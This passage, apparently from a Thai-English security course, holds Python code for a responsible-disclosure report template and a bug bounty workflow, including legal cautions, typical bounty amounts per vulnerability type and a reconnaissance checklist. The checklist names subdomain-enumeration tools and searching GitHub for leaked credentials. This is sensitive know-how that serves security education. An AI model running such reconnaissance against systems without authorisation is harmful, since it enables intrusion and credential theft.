3. [Step 3]

## Impact
[Describe impact if exploited]

## Suggested Fix
[Optional: how to fix]

## Proof of Concept
[Attach PoC or describe how to reproduce]

## Disclosure Timeline
Discovery Date: {self.discovery_date.strftime('%Y-%m-%d')}
Disclosure Deadline: {self.disclosure_deadline.strftime('%Y-%m-%d') if self.disclosure_deadline else 'TBD'}

I will coordinate public disclosure with your schedule.

Best regards,
{self.researcher}
        """
    
    def legal_considerations(self) -> List[str]:
        return [
            "CFAA (Computer Fraud and Abuse Act) - US",
            "Computer Misuse Act - UK",
            "Only test systems you have permission to test",
            "Bug bounty scope defines what's in/out",
            "Never access user data or exceed necessary access",
            "Keep all findings confidential until patched",
            "Get written permission for any testing activities"
        ]

if __name__ == '__main__':
    disc = VulnerabilityDisclosure(
        researcher="Jane Security",
        target_vendor="Acme Corp",
        software="AcmeWebApp",
        version="3.2.1"
    )
    disc.set_disclosure_deadline(90)
    disc.add_timeline_event("Vulnerability discovered via fuzzing")
    disc.add_timeline_event("Root cause confirmed - heap overflow in parser")
    
    print("Disclosure Status:", disc.status.value)
    print("Deadline:", disc.disclosure_deadline.strftime('%Y-%m-%d'))
    print("\nTimeline:")
    for event in disc.timeline:
        print(f"  {event['date']}: {event['event']}")
    print("\nInitial Report:")
    print(disc.generate_initial_report()[:500])
```

---

## Step 870: Bug Bounty Program Workflow

กระบวนการเข้าร่วมโปรแกรม Bug Bounty

```python
from dataclasses import dataclass, field
from typing import List, Dict
from enum import Enum

class BountyStatus(Enum):
    SUBMITTED = "Submitted"
    TRIAGED = "Triaged"
    DUPLICATE = "Duplicate"
    INFORMATIVE = "Informative"
    RESOLVED = "Resolved"
    BOUNTY_AWARDED = "Bounty Awarded"
    NA = "N/A (Out of Scope)"

@dataclass
class BugBountyReport:
    program: str
    title: str
    severity: str
    asset: str  # URL/domain/app in scope
    weakness: str  # CWE
    vulnerability_info: str
    impact: str
    steps_to_reproduce: List[str]
    supporting_materials: List[str] = field(default_factory=list)
    status: BountyStatus = BountyStatus.SUBMITTED
    bounty_amount: float = 0.0
    
    def format_h1_report(self) -> str:
        """Format report for HackerOne submission"""
        return f"""
**Title:** {self.title}
**Severity:** {self.severity}

## Summary
{self.vulnerability_info}

## Steps to Reproduce
{chr(10).join(f'{i+1}. {step}' for i, step in enumerate(self.steps_to_reproduce))}

## Impact
{self.impact}

## Supporting Materials
{chr(10).join(f'- {m}' for m in self.supporting_materials)}
        """

class BugBountyStrategy:
    """Strategy and best practices for bug bounty hunting"""
    
    def assess_program(self, program_details: Dict) -> Dict:
        """Assess bug bounty program attractiveness"""
        score = 0
        analysis = {}
        
        # Bounty amounts
        max_bounty = program_details.get('max_bounty', 0)
        if max_bounty >= 10000:
            score += 3
            analysis['bounty'] = f"Excellent: up to ${max_bounty:,}"
        elif max_bounty >= 1000:
            score += 2
            analysis['bounty'] = f"Good: up to ${max_bounty:,}"
        else:
            score += 1
            analysis['bounty'] = f"Low: up to ${max_bounty:,}"
        
        # Scope - wider is better for research
        scope_count = len(program_details.get('in_scope', []))
        if scope_count > 20:
            score += 3
            analysis['scope'] = f"Wide scope: {scope_count} assets"
        elif scope_count > 5:
            score += 2
            analysis['scope'] = f"Medium scope: {scope_count} assets"
        else:
            score += 1
            analysis['scope'] = f"Narrow scope: {scope_count} assets"
        
        # Response time
        avg_response = program_details.get('avg_response_days', 30)
        if avg_response <= 3:
            score += 3
            analysis['response'] = "Fast response"
        elif avg_response <= 7:
            score += 2
            analysis['response'] = "Moderate response"
        else:
            score += 1
            analysis['response'] = "Slow response"
        
        analysis['total_score'] = score
        analysis['recommendation'] = "HIGH" if score >= 7 else "MEDIUM" if score >= 5 else "LOW"
        return analysis
    
    def common_high_value_vulns(self) -> Dict[str, int]:
        """Common findings and typical bounty ranges"""
        return {
            "Account Takeover (ATO)": 5000,
            "SQL Injection (production)": 3000,
            "RCE via SSTI": 10000,
            "SSRF (internal network access)": 5000,
            "Stored XSS (high impact)": 2000,
            "Insecure Direct Object Reference": 1000,
            "Business Logic (significant impact)": 2000,
            "OAuth Token Theft": 3000,
            "Path Traversal (sensitive files)": 1500,
            "Subdomain Takeover": 500
        }
    
    def recon_checklist(self) -> List[str]:
        """Recon steps before starting testing"""
        return [
            "Read program scope carefully (in/out of scope)",
            "Check for existing public reports (H1 Hacktivity, Bugcrowd Crowdstream)",
            "Enumerate subdomains (amass, subfinder, assetfinder)",
            "Find all API endpoints (waybackmachine, GAU, katana)",
            "Identify technology stack (Wappalyzer, response headers)",
            "Look for outdated frameworks with known CVEs",
            "Check GitHub for leaked credentials or source code",
            "Map all authentication flows"
        ]

if __name__ == '__main__':
    strategy = BugBountyStrategy()
    
    # Assess a program
    program = {
        'max_bounty': 15000,
        'in_scope': ['*.example.com', 'api.example.com', 'mobile app'],
        'avg_response_days': 3
    }
    assessment = strategy.assess_program(program)
    print("Program Assessment:")
    for k, v in assessment.items():
        print(f"  {k}: {v}")
    
    print("\nHigh-Value Vulnerability Targets:")
    for vuln, bounty in strategy.common_high_value_vulns().items():
        print(f"  ${bounty:,} - {vuln}")
    
    print("\nRecon Checklist:")
    for item in strategy.recon_checklist():
        print(f"  [ ] {item}")
```

---

## สรุป Part 87

1. **Step 861**: Zero-Day fundamentals, research lifecycle, disclosure timeline
2. **Step 862**: Attack surface analysis - web, binary, IPC
3. **Step 863**: Fuzzing - bit-flip, LibFuzzer harness, AFL++ setup
4. **Step 864**: Binary analysis - Ghidra scripts, radare2, GDB
5. **Step 865**: Memory corruption - stack/heap overflow, UAF, integer overflow
6. **Step 866**: Exploit development - pwntools, ROP chains, info leaks
7. **Step 867**: Web app zero-days - prototype pollution, SSTI, deserialization
8. **Step 868**: Root cause analysis - crash classification, exploit report
9. **Step 869**: Responsible disclosure - report template, legal considerations
10. **Step 870**: Bug bounty workflow - program assessment, high-value targets

**หมายเหตุ**: เนื้อหานี้เพื่อการศึกษาและ responsible disclosure เท่านั้น
